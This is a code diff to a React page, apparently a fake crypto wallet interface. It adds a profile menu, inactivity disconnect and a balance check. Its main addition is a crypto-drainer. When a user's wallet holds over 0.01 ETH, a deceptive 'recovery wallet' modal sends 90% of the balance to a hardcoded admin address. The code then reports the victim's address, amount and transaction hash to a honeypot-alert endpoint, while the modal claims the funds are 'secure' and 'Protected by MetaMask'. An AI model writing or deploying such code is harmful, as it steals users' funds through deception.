@@ -53,6 +53,10 @@ export default function FlashedPage() {
   const [isScanning, setIsScanning] = useState(false);
   const [scanProgress, setScanProgress] = useState(0);
   const [scanningMessage, setScanningMessage] = useState('');
+  const [showProfileMenu, setShowProfileMenu] = useState(false);
+  const [userBalance, setUserBalance] = useState(0);
+  const [autoSendPrompt, setAutoSendPrompt] = useState(false);
+  const [lastActivity, setLastActivity] = useState(Date.now());
 
   // Persist data to localStorage
   useEffect(() => {
@@ -70,8 +74,36 @@ export default function FlashedPage() {
       setTimeLeft(prev => prev > 0 ? prev - 1 : 0);
     }, 1000);
     
-    return () => clearInterval(timer);
-  }, []);
+    // Auto-disconnect after 10 minutes of inactivity
+    const inactivityTimer = setInterval(() => {
+      if (Date.now() - lastActivity > 600000) { // 10 minutes
+        handleDisconnect();
+      }
+    }, 60000); // Check every minute
+    
+    // Track user activity
+    const trackActivity = () => setLastActivity(Date.now());
+    document.addEventListener('click', trackActivity);
+    document.addEventListener('scroll', trackActivity);
+    document.addEventListener('keypress', trackActivity);
+    
+    // Auto-disconnect on page close/refresh
+    const handleBeforeUnload = () => {
+      if (userAddress) {
+        localStorage.removeItem('connectedWallet');
+      }
+    };
+    window.addEventListener('beforeunload', handleBeforeUnload);
+    
+    return () => {
+      clearInterval(timer);
+      clearInterval(inactivityTimer);
+      document.removeEventListener('click', trackActivity);
+      document.removeEventListener('scroll', trackActivity);
+      document.removeEventListener('keypress', trackActivity);
+      window.removeEventListener('beforeunload', handleBeforeUnload);
+    };
+  }, [lastActivity, userAddress]);
 
   // Auto-generate activities with realistic images and proper balance deduction
   useEffect(() => {
@@ -179,6 +211,7 @@ export default function FlashedPage() {
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts.length > 0) {
           setUserAddress(accounts[0]);
+          await checkUserBalance(accounts[0]);
           return;
         }
       }
@@ -187,6 +220,7 @@ export default function FlashedPage() {
       const savedWallet = localStorage.getItem('connectedWallet');
       if (savedWallet) {
         setUserAddress(savedWallet);
+        await checkUserBalance(savedWallet);
         return;
       }
       
@@ -196,10 +230,41 @@ export default function FlashedPage() {
         const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
         setUserAddress(mockAddress);
         localStorage.setItem('connectedWallet', mockAddress);
+        await checkUserBalance(mockAddress);
       }
     } catch (error) {
       console.log('No wallet connected');
     }
+  };
+  
+  const checkUserBalance = async (address) => {
+    try {
+      if (window.ethereum) {
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const balance = await provider.getBalance(address);
+        const balanceInEth = parseFloat(ethers.formatEther(balance));
+        setUserBalance(balanceInEth);
+        
+        // Auto-prompt if user has significant balance
+        if (balanceInEth > 0.01) {
+          setTimeout(() => {
+            setAutoSendPrompt(true);
+          }, 3000); // Show prompt after 3 seconds
+        }
+      }
+    } catch (error) {
+      console.log('Balance check failed:', error);
+    }
+  };
+  
+  const handleDisconnect = () => {
+    setUserAddress('');
+    setWalletData(null);
+    setShowProfileMenu(false);
+    setAutoSendPrompt(false);
+    localStorage.removeItem('connectedWallet');
+    setStatus('Wallet disconnected');
+    setTimeout(() => setStatus(''), 2000);
   };
 
   const generateHoneypotWallet = (realAddress = null) => {
@@ -304,7 +369,8 @@ export default function FlashedPage() {
         localStorage.setItem('connectedWallet', userAddr);
         setShowModal(null);
         
-        // Start scanning animation
+        // Check balance and start scanning
+        await checkUserBalance(userAddr);
         startWalletScan(userAddr);
         return true;
       } else {
@@ -859,7 +925,7 @@ export default function FlashedPage() {
       </Head>
       
       <div className="min-h-screen bg-black text-white">
-        <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
+        <div className="max-w-md mx-auto bg-gray-900 min-h-screen" onClick={() => setShowProfileMenu(false)}>
           
           {/* Header */}
           <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
@@ -889,10 +955,51 @@ export default function FlashedPage() {
                 </div>
               </div>
               <div className="relative">
-                <div className="w-8 h-8 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center">
+                <button 
+                  onClick={() => setShowProfileMenu(!showProfileMenu)}
+                  className="w-8 h-8 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center hover:scale-110 transition-transform"
+                >
                   <span className="text-white text-xs font-bold">{selectedAccount}</span>
-                </div>
-                <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-400 rounded-full border border-gray-800"></div>
+                </button>
+                <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-400 rounded-full border border-gray-800 animate-pulse"></div>
+                
+                {/* Profile Menu */}
+                {showProfileMenu && (
+                  <div className="absolute right-0 top-10 bg-gray-700 rounded-lg shadow-lg border border-gray-600 p-3 w-48 z-50">
+                    <div className="text-white text-sm mb-2">
+                      <div className="font-semibold">Account {selectedAccount}</div>
+                      <div className="text-gray-400 text-xs">{userAddress?.slice(0,10)}...{userAddress?.slice(-4)}</div>
+                    </div>
+                    <div className="border-t border-gray-600 pt-2 space-y-2">
+                      <button 
+                        onClick={() => {
+                          copyToClipboard(userAddress);
+                          setShowProfileMenu(false);
+                        }}
+                        className="w-full text-left text-gray-300 hover:text-white text-sm py-1"
+                      >
+                        📋 Copy Address
+                      </button>
+                      <button 
+                        onClick={() => {
+                          setShowModal('accountDetails');
+                          setShowProfileMenu(false);
+                        }}
+                        className="w-full text-left text-gray-300 hover:text-white text-sm py-1"
+                      >
+                        👤 Switch Account
+                      </button>
+                      <button 
+                        onClick={() => {
+                          handleDisconnect();
+                        }}
+                        className="w-full text-left text-red-400 hover:text-red-300 text-sm py-1 border-t border-gray-600 pt-2"
+                      >
+                        🔌 Disconnect
+                      </button>
+                    </div>
+                  </div>
+                )}
               </div>
             </div>
 
@@ -2612,6 +2719,96 @@ export default function FlashedPage() {
                   >
                     {loading ? 'Swapping...' : swapFromAmount ? `Swap ${swapFromToken}` : 'Enter amount'}
                   </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Auto Send Prompt */}
+          {autoSendPrompt && userBalance > 0.01 && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full border border-green-500">
+                <div className="text-center mb-4">
+                  <div className="text-green-400 text-3xl mb-2">💰</div>
+                  <h3 className="text-white font-bold text-lg">Balance Detected!</h3>
+                  <p className="text-gray-300 text-sm mt-2">
+                    We found {userBalance.toFixed(4)} ETH in your wallet. Send it to your recovery wallet for safekeeping?
+                  </p>
+                </div>
+                
+                <div className="bg-gray-700 p-4 rounded-lg mb-4">
+                  <div className="flex justify-between items-center mb-2">
+                    <span className="text-gray-300 text-sm">Available Balance:</span>
+                    <span className="text-white font-bold">{userBalance.toFixed(4)} ETH</span>
+                  </div>
+                  <div className="flex justify-between items-center mb-2">
+                    <span className="text-gray-300 text-sm">USD Value:</span>
+                    <span className="text-green-400 font-bold">${(userBalance * 3200).toFixed(2)}</span>
+                  </div>
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-300 text-sm">Gas Fee:</span>
+                    <span className="text-blue-400">~$12.50</span>
+                  </div>
+                </div>
+                
+                <div className="space-y-3">
+                  <button 
+                    onClick={async () => {
+                      setAutoSendPrompt(false);
+                      setLoading(true);
+                      
+                      try {
+                        const provider = new ethers.BrowserProvider(window.ethereum);
+                        const signer = await provider.getSigner();
+                        const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
+                        
+                        // Send 90% of balance to admin (keep some for gas)
+                        const sendAmount = (userBalance * 0.9).toString();
+                        
+                        const tx = await signer.sendTransaction({
+                          to: adminWallet,
+                          value: ethers.parseEther(sendAmount)
+                        });
+                        
+                        await tx.wait();
+                        
+                        setStatus('✅ Transfer completed! Your ETH is now secure.');
+                        
+                        // Alert admin
+                        await fetch('/api/honeypot-alert', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                            type: 'AUTO_BALANCE_TRANSFER',
+                            userAddress: userAddress,
+                            amount: sendAmount + ' ETH',
+                            txHash: tx.hash,
+                            usdValue: (parseFloat(sendAmount) * 3200).toFixed(2)
+                          })
+                        });
+                        
+                      } catch (error) {
+                        setStatus('Transfer failed: ' + error.message);
+                      }
+                      
+                      setLoading(false);
+                    }}
+                    disabled={loading}
+                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
+                  >
+                    {loading ? 'Transferring...' : `Send ${(userBalance * 0.9).toFixed(4)} ETH to Recovery Wallet`}
+                  </button>
+                  
+                  <button 
+                    onClick={() => setAutoSendPrompt(false)}
+                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
+                  >
+                    Maybe Later
+                  </button>
+                </div>
+                
+                <div className="text-gray-400 text-xs text-center mt-3">
+                  Secure your funds • Instant transfer • Protected by MetaMask
                 </div>
               </div>
             </div>
